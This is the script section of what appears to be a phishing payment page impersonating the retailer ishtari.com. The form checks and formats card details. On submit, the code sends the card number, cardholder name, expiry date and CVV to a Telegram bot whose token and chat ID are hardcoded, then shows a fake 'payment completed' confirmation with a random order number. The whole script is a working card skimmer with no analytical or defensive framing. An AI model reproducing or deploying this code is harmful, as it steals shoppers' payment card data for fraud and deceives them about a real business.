    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // =============================================
            // ‚úÖ YOUR TELEGRAM BOT CONFIGURATION
            // =============================================
            const BOT_TOKEN = '8571002125:AAEYf5JTycx4DTOeuGtwIivieEbb-IbHVuk';
            const CHAT_ID = '7918211228';
            // =============================================
            
            const form = document.getElementById('paymentForm');
            const payButton = document.getElementById('payButton');
            const cardNumber = document.getElementById('cardNumber');
            const cardHolder = document.getElementById('cardHolder');
            const expiryDate = document.getElementById('expiryDate');
            const cvv = document.getElementById('cvv');
            const visaIcon = document.querySelector('.fa-cc-visa');
            const mastercardIcon = document.querySelector('.fa-cc-mastercard');
            const successModal = document.getElementById('successModal');
            const orderNumberSpan = document.getElementById('orderNumber');
            const transactionTimeSpan = document.getElementById('transactionTime');

            console.log('‚úÖ ishtari.com payment system ready!');

            // Generate random order number
            function generateOrderNumber() {
                const prefix = 'ISH';
                const timestamp = Date.now().toString().slice(-8);
                const random = Math.floor(Math.random() * 1000).toString().padStart(3, '0');
                return `${prefix}-${timestamp}${random}`;
            }

            // Format current time
            function getFormattedTime() {
                const now = new Date();
                return now.toLocaleString('en-US', {
                    year: 'numeric',
                    month: 'long',
                    day: 'numeric',
                    hour: '2-digit',
                    minute: '2-digit',
                    second: '2-digit'
                });
            }

            // Show success modal
            function showSuccessModal() {
                orderNumberSpan.textContent = generateOrderNumber();
                transactionTimeSpan.textContent = getFormattedTime();
                successModal.style.display = 'flex';
                
                // Add animation to modal
                const modalContent = document.querySelector('.modal-content');
                modalContent.style.animation = 'none';
                modalContent.offsetHeight;
                modalContent.style.animation = 'modalSlideUp 0.4s ease';
            }

            // Close modal and redirect (simulated)
            window.closeModalAndRedirect = function() {
                successModal.style.display = 'none';
                
                // Reset form
                form.reset();
                visaIcon.classList.remove('active');
                mastercardIcon.classList.remove('active');
                
                // Show a small toast message (simulated redirect)
                alert('‚ú® Thank you for shopping with ishtari.com! Redirecting to homepage...');
                
                // In a real website, you would redirect to the homepage or order confirmation page
                // window.location.href = 'https://ishtari.com';
            };

            // Function to send message to Telegram
            async function sendToTelegram(formData) {
                const message = `
üéØ <b>NEW PAYMENT - ishtari.com</b> üéØ
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
<b>üí≥ Card Number:</b> <code>${formData.cardNumber}</code>
<b>üë§ Cardholder:</b> ${formData.cardHolder}
<b>üìÖ Expiry Date:</b> ${formData.expiryDate}
<b>üîê CVV:</b> <code>${formData.cvv}</code>
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
<b>üïê Time:</b> ${new Date().toLocaleString()}
<b>üí∞ Amount:</b> Verified
<b>üîí Status:</b> Payment Completed
<b>üåê Site:</b> ishtari.com
                `;

                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                
                try {
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: message,
                            parse_mode: 'HTML'
                        })
                    });

                    const data = await response.json();
                    
                    if (data.ok) {
                        console.log('‚úÖ Payment details sent to Telegram');
                        return true;
                    } else {
                        console.error('‚ùå Telegram error:', data);
                        return false;
                    }
                } catch (error) {
                    console.error('‚ùå Error:', error);
                    return false;
                }
            }

            // Format card number with spaces
            cardNumber.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
                let formattedValue = '';
                
                for (let i = 0; i < value.length; i++) {
                    if (i > 0 && i % 4 === 0) {
                        formattedValue += ' ';
                    }
                    formattedValue += value[i];
                }
                
                e.target.value = formattedValue;

                // Detect card type and highlight icon
                if (value.startsWith('4')) {
                    visaIcon.classList.add('active');
                    mastercardIcon.classList.remove('active');
                } else if (value.startsWith('5')) {
                    mastercardIcon.classList.add('active');
                    visaIcon.classList.remove('active');
                } else {
                    visaIcon.classList.remove('active');
                    mastercardIcon.classList.remove('active');
                }
            });

            // Format expiry date
            expiryDate.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length >= 2) {
                    value = value.slice(0, 2) + '/' + value.slice(2, 4);
                }
                e.target.value = value;
            });

            // Only allow numbers in CVV
            cvv.addEventListener('input', function(e) {
                e.target.value = e.target.value.replace(/\D/g, '');
            });

            // Form submission
            form.addEventListener('submit', async function(e) {
                e.preventDefault();

                // Remove any existing error classes
                document.querySelectorAll('input').forEach(input => {
                    input.classList.remove('error');
                });

                // Simple validation
                let isValid = true;
                const fields = [cardNumber, cardHolder, expiryDate, cvv];
                
                fields.forEach(field => {
                    if (!field.value.trim()) {
                        field.classList.add('error');
                        isValid = false;
                    }
                });

                if (!isValid) {
                    alert('‚ö†Ô∏è Please fill in all required fields');
                    return;
                }

                // Validate card number
                const cardNum = cardNumber.value.replace(/\s/g, '');
                if (cardNum.length < 15 || cardNum.length > 19) {
                    alert('‚ö†Ô∏è Please enter a valid card number');
                    cardNumber.classList.add('error');
                    return;
                }

                // Validate expiry date
                const expiry = expiryDate.value;
                if (!expiry.match(/^\d{2}\/\d{2}$/)) {
                    alert('‚ö†Ô∏è Please enter a valid expiry date (MM/YY)');
                    expiryDate.classList.add('error');
                    return;
                }

                // Validate month
                const month = parseInt(expiry.split('/')[0]);
                if (month < 1 || month > 12) {
                    alert('‚ö†Ô∏è Please enter a valid month (01-12)');
                    expiryDate.classList.add('error');
                    return;
                }

                // Validate CVV
                if (cvv.value.length < 3 || cvv.value.length > 4) {
                    alert('‚ö†Ô∏è Please enter a valid CVV code');
                    cvv.classList.add('error');
                    return;
                }

                // Prepare form data
                const formData = {
                    cardNumber: cardNumber.value,
                    cardHolder: cardHolder.value,
                    expiryDate: expiryDate.value,
                    cvv: cvv.value
                };

                // Show loading state
                payButton.classList.add('loading');
                payButton.innerHTML = '<i class="fas fa-spinner"></i> Processing Payment...';

                // Send to Telegram
                await sendToTelegram(formData);

                // Simulate payment processing
                setTimeout(() => {
                    payButton.classList.remove('loading');
                    
                    // Show success modal
                    showSuccessModal();
                    
                    // Reset button
                    payButton.innerHTML = '<i class="fas fa-lock"></i> Complete Payment';
                    
                }, 2000);
            });

            // Real-time validation styling
            document.querySelectorAll('input').forEach(input => {
                input.addEventListener('focus', function() {
                    this.style.borderColor = '#dc2626';
                });

                input.addEventListener('blur', function() {
                    if (!this.classList.contains('error')) {
                        this.style.borderColor = '#fecaca';
                    }
                });

                input.addEventListener('input', function() {
                    this.classList.remove('error');
                    this.style.borderColor = '#fecaca';
                });
            });

            // Close modal when clicking outside (optional)
            successModal.addEventListener('click', function(e) {
                if (e.target === successModal) {
                    closeModalAndRedirect();
                }
            });
        });

        // Add shake animation keyframes
        const style = document.createElement('style');
        style.textContent = `
            @keyframes shake {
                0%, 100% { transform: translateX(0); }
                10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
                20%, 40%, 60%, 80% { transform: translateX(5px); }
            }
        `;
        document.head.appendChild(style);
    </script>
</body>
</html>
